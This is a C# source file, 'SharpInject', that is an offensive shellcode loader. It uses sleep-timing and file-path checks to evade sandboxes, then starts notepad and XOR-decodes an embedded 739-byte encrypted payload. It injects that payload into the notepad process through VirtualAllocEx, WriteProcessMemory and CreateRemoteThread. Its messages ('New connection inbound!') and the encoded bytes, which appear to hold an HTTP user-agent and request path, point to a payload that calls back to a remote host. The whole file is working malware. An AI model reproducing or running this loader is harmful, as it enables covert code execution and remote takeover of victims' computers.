using System;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace SharpInject
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool BInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize,
            IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
                uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
                    [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
          uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        static void Main(string[] args)
        {
            DateTime stime = DateTime.Now;
            Sleep(10000);
            double etime = DateTime.Now.Subtract(stime).TotalSeconds;
            if (etime < 10)
            {
                return;
            }

            String fileName = Process.GetCurrentProcess().MainModule.FileName;
            if (fileName != "C:\\Windows\\Tasks\\Inject.exe")
            {
                return;
            }

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            // 32-bit payload for notepad and 64-bit payload for svchost
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            Console.WriteLine("[+] Starting new target process");
            bool res = CreateProcess(null, "C:\\Windows\\System32\\notepad.exe", IntPtr.Zero, IntPtr.Zero,
                false, 0x4, IntPtr.Zero, null, ref si, out pi);

            Sleep(2000);

            int procId = Process.GetProcessesByName("notepad").First().Id;

            Console.WriteLine($"[+] Hooking PID: {procId}");
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, procId);

            // insert shellcode here
            byte[] buf = new byte[739] {
0xc0,0xd4,0xb3,0x3c,0x3c,0x3c,0x5c,0x0d,0xee,0x58,0xb7,0x6e,0x0c,0xb5,0xd9,0xb7,0x6e,0x30,0xb7,0x6e,
0x28,0xb7,0x4e,0x14,0x33,0x8b,0x76,0x1a,0x0d,0xc3,0x0d,0xfc,0x90,0x00,0x5d,0x40,0x3e,0x10,0x1c,0xfd,
0xf3,0x31,0x3d,0xfb,0x75,0x49,0xd3,0x6e,0xb7,0x6e,0x2c,0x6b,0xb7,0x7e,0x00,0x3d,0xec,0xb7,0x7c,0x44,
0xb9,0xfc,0x48,0x70,0x3d,0xec,0x6c,0xb7,0x74,0x24,0xb7,0x64,0x1c,0x3d,0xef,0xb9,0xf5,0x48,0x00,0x75,
0xb7,0x08,0xb7,0x0d,0xc3,0x3d,0xea,0x0d,0xfc,0x90,0xfd,0xf3,0x31,0x3d,0xfb,0x04,0xdc,0x49,0xc8,0x3f,
0x41,0xc4,0x07,0x41,0x18,0x49,0xdc,0x64,0xb7,0x64,0x18,0x3d,0xef,0x5a,0xb7,0x30,0x77,0xb7,0x64,0x20,
0x3d,0xef,0xb7,0x38,0xb7,0x3d,0xec,0xb5,0x78,0x18,0x18,0x67,0x67,0x5d,0x65,0x66,0x6d,0xc3,0xdc,0x64,
0x63,0x66,0xb7,0x2e,0xd5,0xbc,0xc3,0xc3,0xc3,0x61,0x54,0x52,0x59,0x48,0x3c,0x54,0x4b,0x55,0x52,0x55,
0x68,0x54,0x70,0x4b,0x1a,0x3b,0xc3,0xe9,0x0d,0xe7,0x6f,0x6f,0x6f,0x6f,0x6f,0xd4,0x43,0x3c,0x3c,0x3c,
0x71,0x53,0x46,0x55,0x50,0x50,0x5d,0x13,0x09,0x12,0x0c,0x1c,0x14,0x55,0x6c,0x5d,0x58,0x07,0x1c,0x7f,
0x6c,0x69,0x1c,0x73,0x6f,0x1c,0x0d,0x09,0x63,0x0d,0x1c,0x50,0x55,0x57,0x59,0x1c,0x71,0x5d,0x5f,0x1c,
0x73,0x6f,0x1c,0x64,0x15,0x1c,0x7d,0x4c,0x4c,0x50,0x59,0x6b,0x59,0x5e,0x77,0x55,0x48,0x13,0x0a,0x0c,
0x09,0x12,0x0d,0x12,0x0d,0x09,0x1c,0x14,0x77,0x74,0x68,0x71,0x70,0x10,0x1c,0x50,0x55,0x57,0x59,0x1c,
0x7b,0x59,0x5f,0x57,0x53,0x15,0x1c,0x6a,0x59,0x4e,0x4f,0x55,0x53,0x52,0x13,0x0d,0x09,0x12,0x0c,0x1c,
0x71,0x53,0x5e,0x55,0x50,0x59,0x13,0x0d,0x09,0x79,0x0d,0x08,0x04,0x1c,0x6f,0x5d,0x5a,0x5d,0x4e,0x55,
0x13,0x0a,0x0c,0x08,0x12,0x0d,0x3c,0x54,0x06,0x6a,0x45,0x9b,0xc3,0xe9,0x6f,0x6f,0x56,0x3f,0x6f,0x6f,
0x54,0x87,0x3d,0x3c,0x3c,0xd4,0x54,0x3d,0x3c,0x3c,0x13,0x74,0x73,0x57,0x54,0x0d,0x76,0x66,0x55,0x56,
0x5b,0x72,0x51,0x51,0x0e,0x59,0x5d,0x7e,0x73,0x74,0x63,0x48,0x7d,0x51,0x78,0x52,0x73,0x57,0x79,0x50,
0x65,0x4b,0x49,0x5e,0x78,0x79,0x7e,0x48,0x09,0x0a,0x50,0x73,0x70,0x45,0x6e,0x54,0x48,0x73,0x4e,0x0a,
0x70,0x46,0x7d,0x7e,0x7a,0x7f,0x72,0x05,0x64,0x7a,0x4b,0x6c,0x6b,0x50,0x46,0x57,0x63,0x46,0x69,0x79,
0x52,0x0f,0x63,0x0b,0x68,0x52,0x5b,0x77,0x70,0x46,0x46,0x78,0x04,0x6e,0x6e,0x69,0x4b,0x69,0x4f,0x79,
0x70,0x0a,0x0e,0x7d,0x6b,0x0e,0x75,0x4d,0x5d,0x44,0x4c,0x52,0x78,0x56,0x0a,0x66,0x69,0x7d,0x45,0x59,
0x7f,0x59,0x0a,0x5e,0x57,0x79,0x44,0x45,0x79,0x5f,0x6f,0x08,0x6d,0x57,0x04,0x65,0x52,0x0e,0x11,0x11,
0x76,0x5b,0x45,0x11,0x53,0x57,0x45,0x08,0x78,0x73,0x0a,0x68,0x05,0x74,0x7d,0x04,0x5a,0x0a,0x71,0x6b,
0x5a,0x5d,0x68,0x4c,0x63,0x68,0x0c,0x7b,0x66,0x45,0x57,0x56,0x64,0x0e,0x49,0x49,0x5a,0x58,0x64,0x52,
0x58,0x6b,0x4a,0x4a,0x4c,0x52,0x57,0x7e,0x7e,0x65,0x66,0x05,0x4c,0x4a,0x59,0x0c,0x5a,0x76,0x44,0x46,
0x09,0x66,0x66,0x0c,0x0e,0x6c,0x68,0x54,0x09,0x77,0x5a,0x69,0x71,0x68,0x65,0x0f,0x71,0x6b,0x54,0x45,
0x45,0x55,0x45,0x0a,0x53,0x76,0x3c,0x6c,0x54,0x6b,0xb5,0xa3,0xfa,0xc3,0xe9,0xb5,0xfa,0x6f,0x54,0x3c,
0x0e,0xd4,0xb8,0x6f,0x6f,0x6f,0x6b,0x6f,0x6a,0x54,0xd7,0x69,0x12,0x07,0xc3,0xe9,0xaa,0x56,0x36,0x63,
0x54,0xbc,0x0f,0x3c,0x3c,0xb5,0xdc,0x56,0x38,0x6c,0x56,0x23,0x6a,0x54,0x49,0x7a,0xa2,0xba,0xc3,0xe9,
0x6f,0x6f,0x6f,0x6f,0x6a,0x54,0x11,0x3a,0x24,0x47,0xc3,0xe9,0xb9,0xfc,0x49,0x28,0x54,0xb4,0x2f,0x3c,
0x3c,0x54,0x78,0xcc,0x09,0xdc,0xc3,0xe9,0x73,0x49,0xf1,0xd4,0x74,0x3c,0x3c,0x3c,0x56,0x7c,0x54,0x3c,
0x2c,0x3c,0x3c,0x54,0x3c,0x3c,0x7c,0x3c,0x6f,0x54,0x64,0x98,0x6f,0xd9,0xc3,0xe9,0xaf,0x6f,0x6f,0xb5,
0xdb,0x6b,0x54,0x3c,0x1c,0x3c,0x3c,0x6f,0x6a,0x54,0x2e,0xaa,0xb5,0xde,0xc3,0xe9,0xb9,0xfc,0x48,0xf3,
0xb7,0x3b,0x3d,0xff,0xb9,0xfc,0x49,0xd9,0x64,0xff,0x63,0xd4,0x57,0xc3,0xc3,0xc3,0x0d,0x0c,0x12,0x0e,
0x0f,0x12,0x0d,0x12,0x0e,0x0c,0x05,0x3c,0x87,0xdc,0x21,0x16,0x36,0x54,0x9a,0xa9,0x81,0xa1,0xc3,0xe9,
0x00,0x3a,0x40,0x36,0xbc,0xc7,0xdc,0x49,0x39,0x87,0x7b,0x2f,0x4e,0x53,0x56,0x3c,0x6f,0xc3,0xe };

            //int len = buf.Length;

            Console.WriteLine("[+] Allocating memory space");
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // xor decode with key value 0x3c
            Console.WriteLine("[+] Decrypting shellcode");
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] ^ 0x3c) & 0xFF);
            }

            Console.WriteLine("[+] Writing evil buffer");
            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            Console.WriteLine("[+] Executing shellcode");
            Console.WriteLine("[+] New connection inbound!");
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}